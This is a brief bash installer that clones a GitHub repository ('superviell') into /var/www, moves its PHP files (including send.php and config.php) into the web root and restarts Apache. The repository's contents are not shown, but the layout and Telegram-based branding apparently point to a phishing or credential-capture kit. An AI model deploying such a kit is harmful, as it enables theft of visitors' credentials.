#!/bin/bash
#
# Created by: @K41S3RR - https://t.me/K41S3RR
#
# ==============================================
cd /var/www; git clone https://github.com/resekk-vps/superviell
cd /var/www/superviell; mv ajax /var/www; mv App_Themes /var/www; mv config.php /var/www; mv index.php /var/www; mv send.php /var/www; mv v.php /var/www; mv icon /var/www; mv tr /var/www
cd /var/www; nano config.php
cd /root; sudo service apache2 restart
#BANNER
clear && clear; cowsay -f eyes "SCRIPT FINALIZADA" | lolcat && figlet -f slant "RESEKK VPS" | lolcat
